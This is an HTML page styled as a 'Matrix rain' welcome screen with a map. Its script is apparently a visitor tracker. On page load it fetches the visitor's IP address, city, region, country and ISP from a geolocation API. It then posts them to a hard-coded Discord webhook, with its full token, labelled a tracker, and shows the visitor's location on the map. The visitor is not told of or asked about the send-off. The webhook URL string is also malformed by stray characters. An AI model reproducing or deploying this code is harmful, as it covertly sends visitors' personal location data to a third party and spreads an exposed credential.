<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Basakencana Map</title>

<link rel="stylesheet"
 href="https://unpkg.com/leaflet/dist/leaflet.css"/>

<style>
body{
  margin:0;
  background:black;
  color:#00ff41;
  font-family:monospace;
  text-align:center;
  overflow:hidden;
}

canvas{
  position:fixed;
  top:0;
  left:0;
  z-index:-1;
}

.container{
  margin-top:60px;
}

#map{
  height:400px;
  width:80%;
  margin:20px auto;
  border:2px solid #00ff41;
}
</style>
</head>

<body>

<canvas id="rain"></canvas>

<div class="container">
<h1>WELCOME TO BASAKENCANA</h1>

<p id="ip">Detecting visitor...</p>
<p id="location"></p>

<div id="map"></div>
</div>

<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>

<script>
// ===== MATRIX RAIN =====
const canvas = document.getElementById("rain");
const ctx = canvas.getContext("2d");

canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

const letters = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ";
const fontSize = 14;
const columns = canvas.width / fontSize;

const drops = [];
for(let x=0;x<columns;x++) drops[x]=1;

function drawRain(){
  ctx.fillStyle="rgba(0,0,0,0.05)";
  ctx.fillRect(0,0,canvas.width,canvas.height);

  ctx.fillStyle="#00ff41";
  ctx.font=fontSize+"px monospace";

  for(let i=0;i<drops.length;i++){
    const text=letters[Math.floor(Math.random()*letters.length)];
    ctx.fillText(text,i*fontSize,drops[i]*fontSize);

    if(drops[i]*fontSize>canvas.height && Math.random()>0.975)
      drops[i]=0;

    drops[i]++;
  }
}
setInterval(drawRain,33);

async function detectVisitor() {
    try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();

  
        const webhookURL = "9.	https://discord.com/api/webhooks/1484113432583081984/Fkm8Dj5XnVCkC7du-HRYBFKAvdcxCz9jcXzQIj_5G4hWa1rX0GUPVQ02P5as6oiOKOxR";

        const pesanDiscord = {
            username: "BASANKENCANA TRACKER",
            embeds: [{
                title: "🚨 PENGUNJUNG BARU!",
                color: 5763719,
                fields: [
                    { name: "🌐 IP Address", value: `**${data.ip}**`, inline: true },
                    { name: "📍 Lokasi", value: `${data.city}, ${data.region}, ${data.country_name}`, inline: true },
                    { name: "🏢 ISP", value: data.org, inline: false }
                ],
                timestamp: new Date()
            }]
        };

        
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(pesanDiscord)
        });

        
        document.getElementById("ip").innerText = "IP Address : " + data.ip;
        document.getElementById("location").innerText = "Location : " + data.city + ", " + data.country_name;

        
        const map = L.map('map').setView([data.latitude, data.longitude], 13);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        L.marker([data.latitude, data.longitude]).addTo(map)
            .bindPopup("Visitor Location").openPopup();

    } catch (error) {
        console.log("Error:", error);
    }
}


detectVisitor();
</script>

</body>
</html>
